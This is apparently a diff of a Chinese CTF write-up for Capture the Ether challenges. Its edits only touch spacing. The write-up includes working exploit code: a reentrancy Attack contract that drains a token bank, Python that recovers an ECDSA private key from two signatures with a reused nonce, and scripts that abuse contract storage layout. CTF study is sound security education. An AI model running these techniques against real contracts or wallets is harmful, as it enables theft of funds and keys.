-2. 这时候 我们需要纠正过head的值, 因此发起第二笔upsert tx: $index=2, timestamp=0, msg.value=1wei$, 这个时候, head的值等于0, **queue里面存了两个元素**, 第一个元素的amount=1E, timestamp=now+50years, 第二个元素的amount=2WEI, timestamp等于$0$ , address(this)=1E+1WEI+1WEI
+2. 这时候 我们需要纠正过 head 的值, 因此发起第二笔 upsert tx: $index=2, timestamp=0, msg.value=1wei$, 这个时候, head 的值等于 0, **queue 里面存了两个元素**, 第一个元素的 amount=1E, timestamp=now+50years, 第二个元素的 amount=2WEI, timestamp 等于$0$ , address(this)=1E+1WEI+1WEI
 
-   > 因为msg.value=1WEI, 所以queue里面 是两个元素的长度, 把第二个元素重写了
+   > 因为 msg.value=1WEI, 所以 queue 里面 是两个元素的长度, 把第二个元素重写了
    >
-   > 如果msg.value=2WEI的话, 索然不会重写元素, 但是提取的时候, 会发现提取不了, 因为余额不够了
+   > 如果 msg.value=2WEI 的话, 索然不会重写元素, 但是提取的时候, 会发现提取不了, 因为余额不够了
    >
-   > 如果不重写, 需要的余额是 1E+2WEI+3WEI, 而账上余额只会是1E+1WEI+1WEI=1E+2WEI, 少了3WEI
+   > 如果不重写, 需要的余额是 1E+2WEI+3WEI, 而账上余额只会是 1E+1WEI+1WEI=1E+2WEI, 少了 3WEI
    >
-   > ❤️ 第二种思路在这 ✔️, 即不重写第二个元素, 缺少3WEI的情况下, 用上面我们提到的 selfstruct函数 , 把3WEI送过去, 也能完成.
+   > ❤️ 第二种思路在这 ✔️, 即不重写第二个元素, 缺少 3WEI 的情况下, 用上面我们提到的 selfstruct 函数 , 把 3WEI 送过去, 也能完成.
 
    ```javascript
    async function main(){
@@ -649,10 +654,10 @@ const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x00000000000000
      const hash = await wallet.sendTransaction(tx)
      await hash.wait()
      console.log(hash.hash)
-   
+
      // const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(3))
      // console.log(position)
-   
+
      // const end2 = await provider.getStorageAt("0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5", position)
      // console.log(end2)
    }
@@ -660,7 +665,7 @@ const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x00000000000000
 
 3. 这个时候 运行 withdraw(1) 即可把所有的钱取出来
 
-   > 相应的第二种思路 这里改一下withdraw(2)即可
+   > 相应的第二种思路 这里改一下 withdraw(2)即可
 
    ```javascript
    async function main(){
@@ -678,27 +683,27 @@ const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x00000000000000
    }
    ```
 
-返回Check, 完成✅
+返回 Check, 完成 ✅
 
---------
+---
 
 ### Accounts
 
 ###### Fuzzy Identity
 
-这个题大概要求是 创建一个合约地址 [由于有一个name()的接口 这一定是合约地址], 这个合约地址需要满足两个要求:
+这个题大概要求是 创建一个合约地址 [由于有一个 name()的接口 这一定是合约地址], 这个合约地址需要满足两个要求:
 
-1. 调用name() 返回 bytes32(smarx), 这个不难, 在合约中实现一下即可
+1. 调用 name() 返回 bytes32(smarx), 这个不难, 在合约中实现一下即可
 
-2. 创建的这个合约, 需要满足, 它的地址 是符合 `isBadCode` 的要求的, 即合约地址中, 存在着这样的六个字符即可 “badc0de” 
+2. 创建的这个合约, 需要满足, 它的地址 是符合 `isBadCode` 的要求的, 即合约地址中, 存在着这样的六个字符即可 “badc0de”
 
-   > 之所以, 必须要有这6个字符, 不需要管出现在哪个位置, 
+   > 之所以, 必须要有这 6 个字符, 不需要管出现在哪个位置,
    >
-   > 1. 是因为 isBadCode 这个判断中, 会让合约地址 与 ffffff 做 **位与运算** 运算结果 需要等于 **badc0de** 
-   > 2. 不需要管位置是因为, 会进行34次迭代, 即这六个字母 从最后面 一直挪到最前面
-   > 3. 如果想要结果 等于 badc0de 的话, 这一定要确保 合约地址中也出现这六个字符 才能出现这个结果 
+   > 1. 是因为 isBadCode 这个判断中, 会让合约地址 与 ffffff 做 **位与运算** 运算结果 需要等于 **badc0de**
+   > 2. 不需要管位置是因为, 会进行 34 次迭代, 即这六个字母 从最后面 一直挪到最前面
+   > 3. 如果想要结果 等于 badc0de 的话, 这一定要确保 合约地址中也出现这六个字符 才能出现这个结果
 
-第二个要难一些, 解题的JS代码如下: [时间要长一些, 我大概跑了 200W地址吧 🥲]
+第二个要难一些, 解题的 JS 代码如下: [时间要长一些, 我大概跑了 200W 地址吧 🥲]
 
 ```javascript
 async function main(){
@@ -731,7 +736,7 @@ async function main(){
 }
 ```
 
- 拿到相应的私钥 以及 Nonce之后, 便可以部署 符合地址要求的attack合约了
+拿到相应的私钥 以及 Nonce 之后, 便可以部署 符合地址要求的 attack 合约了
 
 相应的合约代码如下
 
@@ -785,15 +790,15 @@ contract attack {
 }
 ```
 
-返回检查, 完成✅
+返回检查, 完成 ✅
 
 ---
 
 ###### Public Key
 
-这个题目要求是 计算出 相应地址的公钥, 如果无任何头绪计算, 则很明显是不可能的事情, **但是如果有了某个账户发出的tx, 这我们可以根据这笔tx 判断出相应地址的 公钥**, 从ropsten上面 找到这一笔 [tx](0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb)  根据这笔tx的信息, 我们就能推断出公钥.
+这个题目要求是 计算出 相应地址的公钥, 如果无任何头绪计算, 则很明显是不可能的事情, **但是如果有了某个账户发出的 tx, 这我们可以根据这笔 tx 判断出相应地址的 公钥**, 从 ropsten 上面 找到这一笔 [tx](0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb) 根据这笔 tx 的信息, 我们就能推断出公钥.
 
-推断公钥的 JS代码如下
+推断公钥的 JS 代码如下
 
 ```javascript
 async function main(){
@@ -818,7 +823,7 @@ async function main(){
 }
 ```
 
-由于合约没有开源验证, 因此 ethers 发送tx的代码如下:
+由于合约没有开源验证, 因此 ethers 发送 tx 的代码如下:
 
 ```javascript
 async function main(){
@@ -835,24 +840,24 @@ async function main(){
 }
 ```
 
- 返回Check, 完成✅
+返回 Check, 完成 ✅
 
 ---
 
 ###### Takeover Account
 
-这个题目的要求, 是 从指定的账户 `0x6B477781b0e68031109f21887e6B5afEAaEB002b` 发出一笔tx, **如果想要从某个account发出tx, 那么 一定要需要掌握这个account的私钥**, 因此 我们要去推这个账户的私钥.
+这个题目的要求, 是 从指定的账户 `0x6B477781b0e68031109f21887e6B5afEAaEB002b` 发出一笔 tx, **如果想要从某个 account 发出 tx, 那么 一定要需要掌握这个 account 的私钥**, 因此 我们要去推这个账户的私钥.
 
-查询账户的历史交易记录, 能发现此Account 发出过两笔tx, 用的都是同一个 **在ECDSA中的k-value** [所反映出来的就是 **签名的r值是相同的**, 理论上来说 k-value 都是不同的, 即签名的r值是不同的,  **这里的两笔tx的r 是相同的, 那么我们就能根据两个相同的r 计算出私钥**] 
+查询账户的历史交易记录, 能发现此 Account 发出过两笔 tx, 用的都是同一个 **在 ECDSA 中的 k-value** [所反映出来的就是 **签名的 r 值是相同的**, 理论上来说 k-value 都是不同的, 即签名的 r 值是不同的, **这里的两笔 tx 的 r 是相同的, 那么我们就能根据两个相同的 r 计算出私钥**]
 
-> 由于 ropsten.etherscan 不好使, 看不到那条记录, 所以可以download成csv, 第一条和第二条tx 这是对应的, 分别是如下两条:
+> 由于 ropsten.etherscan 不好使, 看不到那条记录, 所以可以 download 成 csv, 第一条和第二条 tx 这是对应的, 分别是如下两条:
 >
 > 1. “0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396”
-> 2. “0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009“ 
+> 2. “0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009“
 >
 > 相应的理论知识可以看最后的参考文献 ❤️
 
-首先, 利用这两条tx 求出我们所需要的信息 (s1, z1) (s2, z2) 以及 r, 相应的JS代码如下: 
+首先, 利用这两条 tx 求出我们所需要的信息 (s1, z1) (s2, z2) 以及 r, 相应的 JS 代码如下:
 
 ```javascript
 async function main(){
@@ -888,7 +893,7 @@ async function main(){
 }
 ```
 
-其次 有了上面所求信息, 用Python 求解私钥, Python代码如下:
+其次 有了上面所求信息, 用 Python 求解私钥, Python 代码如下:
 
 ```python
 r  = 0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166
@@ -908,22 +913,22 @@ p = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
 # based on Fermat's Little Theorem
 # works only on prime n
 def inverse_mod(a, n):
-    return pow(a, n-2, n) 
-    
+    return pow(a, n-2, n)
+
 
 k = (z1 - z2) * inverse_mod(s1 - s2, p) % p             # derive k for s1 - s2
-pk = (s1 * k - z1) * inverse_mod(r, p) % p              # derive private key  
+pk = (s1 * k - z1) * inverse_mod(r, p) % p              # derive private key
 pkNeg = (-s1 * (-k % p) - z1) * inverse_mod(r, p) % p   # -k (mod p) of s1 - s2 == -s1 + s2, check -s1
 
 print('k           = {:x}'.format(k))
 print('k negation  = {:x}'.format(-k % p))
 if pk == pkNeg:                                         # should not be false
-    print('private key = {:x}'.format(pk))  
+    print('private key = {:x}'.format(pk))
 
-    
+
 ```
 
-最后, 拿到私钥之后, 由于合约没有开源验证, 用ethers发起tx: 
+最后, 拿到私钥之后, 由于合约没有开源验证, 用 ethers 发起 tx:
 
 ```javascript
 async function main(){
@@ -941,7 +946,7 @@ async function main(){
 }
 ```
 
-返回Check, 完成✅
+返回 Check, 完成 ✅
 
 ---
 
@@ -951,15 +956,15 @@ async function main(){
 
 这个题, 比较简单, 开始挑战之后, 去到合约地址, 由于已经开源验证, 所以 先执行`AssumeOwmershipChallenge` 这个函数, 再执行 `authenticate` 这个函数.
 
-最后返回Check, 完成✅
+最后返回 Check, 完成 ✅
 
 ---
 
 ###### Token Bank
 
-这个题的意思是, 创建了一个Token--SET , 总量是 1,000,000 个 (单位是10**18), 然后又创建了个银行, 银行持有Token的一半, 开始挑战的人 (我) 持有Token的一半, 一开始SET的总量 都在这个银行里面存着, 但是我随时可以把属于我的那一半Token取出来.  这个题的要求是 把银行里面的Token 给他清空掉.
+这个题的意思是, 创建了一个 Token--SET , 总量是 1,000,000 个 (单位是 10\*\*18), 然后又创建了个银行, 银行持有 Token 的一半, 开始挑战的人 (我) 持有 Token 的一半, 一开始 SET 的总量 都在这个银行里面存着, 但是我随时可以把属于我的那一半 Token 取出来. 这个题的要求是 把银行里面的 Token 给他清空掉.
 
-找一找bug, bug发生在这句话 `ITokenReceiver(to).tokenFallback(msg.sender, value, data);`  结合Bank里面的 `tokenFallback`  函数来看, 这句话想要做的是: 如果一个人响银行转帐, 那么这个人的账上就多出相应的余额, **只不过 判断条件错了** 这里的判断条件是 只要目的地是合约, 都会启动这句话, 因此 可以建立一个攻击合约. 攻击合约中写好`tokenFallback` 函数, **利用合约重入**,就可以把银行里的钱都转出来.
+找一找 bug, bug 发生在这句话 `ITokenReceiver(to).tokenFallback(msg.sender, value, data);` 结合 Bank 里面的 `tokenFallback` 函数来看, 这句话想要做的是: 如果一个人响银行转帐, 那么这个人的账上就多出相应的余额, **只不过 判断条件错了** 这里的判断条件是 只要目的地是合约, 都会启动这句话, 因此 可以建立一个攻击合约. 攻击合约中写好`tokenFallback` 函数, **利用合约重入**,就可以把银行里的钱都转出来.
 
 ```javascript
 // 读取mapping 即 balanceOf的一个小测试
@@ -987,7 +992,7 @@ async function main(){
 }d
 ```
 
-其次, 我们部署Attack合约
+其次, 我们部署 Attack 合约
 
 ```solidity
 pragma solidity ^0.4.21;
@@ -1099,7 +1104,7 @@ contract Attack {
     function tokenFallback() public {
         check=check+1;
         if(check <= 2){
-        target1.withdraw(500000 * 10**18);    
+        target1.withdraw(500000 * 10**18);
         }
     }
 
@@ -1109,9 +1114,9 @@ contract Attack {
 }
 ```
 
-~~然后, 部署完成之后, 从Metamask里面 把我们钱包的 500,000 SET Token 转到部署好的Attack合约中~~
+~~然后, 部署完成之后, 从 Metamask 里面 把我们钱包的 500,000 SET Token 转到部署好的 Attack 合约中~~
 
-注意, 这里不能用Transfer转账, 因为 Transfer 的To是一个合约地址, 会激发我们Attack合约中的 `tokenFallback` 函数
+注意, 这里不能用 Transfer 转账, 因为 Transfer 的 To 是一个合约地址, 会激发我们 Attack 合约中的 `tokenFallback` 函数
 
 所以需要我们将 SET 授权给 Attack, 授权代码
 
@@ -1130,13 +1135,13 @@ async function main(){
 }
 ```
 
-然后运行Attack合约的 action1, 利用 TranferFrom 转到Attack合约中, 
+然后运行 Attack 合约的 action1, 利用 TranferFrom 转到 Attack 合约中,
 
-再运行 action2, 将Attack合约, 在银行中 有足够的余额.
+再运行 action2, 将 Attack 合约, 在银行中 有足够的余额.
 
-最后运行 `tokenFallback` 则把Bank 中的 所有 SET Token 都清零了
+最后运行 `tokenFallback` 则把 Bank 中的 所有 SET Token 都清零了
 
-返回Check, 完成✅
+返回 Check, 完成 ✅
 
 ---
 
@@ -1144,9 +1149,9 @@ async function main(){
 
 ###### Mapping Slot
 
-上面有动态数组根据Slot, 拿到Value
+上面有动态数组根据 Slot, 拿到 Value
 
-如果是mapping, 则更特殊一些, 
+如果是 mapping, 则更特殊一些,
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -1188,7 +1193,7 @@ async function main() {
   const privider = waffle.provider;
   const UserPass = await ethers.getContractFactory("UserPass");
   const userpass = await UserPass.deploy();
-  let user1, user2; 
+  let user1, user2;
   [user1, user2] = await ethers.getSigners();
 
   await userpass.deployed();
@@ -1209,13 +1214,13 @@ async function main() {
 let hash;
 console.log("\\n与动态数组不同，mapping数据不在slot中存储长度:%s",await privider.getStorageAt(userpass.address, 1));
 hash = await ethers.utils.keccak256(await ethers.utils.defaultAbiCoder.encode(["address", "uint"], [user1.address,1]))
-console.log("\\n根据mapping的key(addr:%s)计算得到hash(即为value所在的槽地址)=%s", user1.address,hash); 
-console.log("\\nmapping数据users的name:%s",await privider.getStorageAt(userpass.address, hash)); 
+console.log("\\n根据mapping的key(addr:%s)计算得到hash(即为value所在的槽地址)=%s", user1.address,hash);
+console.log("\\nmapping数据users的name:%s",await privider.getStorageAt(userpass.address, hash));
 console.log("\\nmapping数据users的password:%s",await privider.getStorageAt(userpass.address, addrAdd(hash, 1)));
 
 hash = await ethers.utils.keccak256(await ethers.utils.defaultAbiCoder.encode(["address", "uint"], [user2.address,1]))
-console.log("\\n根据mapping的key(addr:%s)计算得到hash(即为value所在的槽地址)=%s", user2.address,hash); 
-console.log("\\nmapping数据users的name:%s",await privider.getStorageAt(userpass.address, hash)); 
+console.log("\\n根据mapping的key(addr:%s)计算得到hash(即为value所在的槽地址)=%s", user2.address,hash);
+console.log("\\nmapping数据users的name:%s",await privider.getStorageAt(userpass.address, hash));
 console.log("\\nmapping数据users的password:%s",await privider.getStorage At(userpass.address, addrAdd(hash, 1)));
 
 }
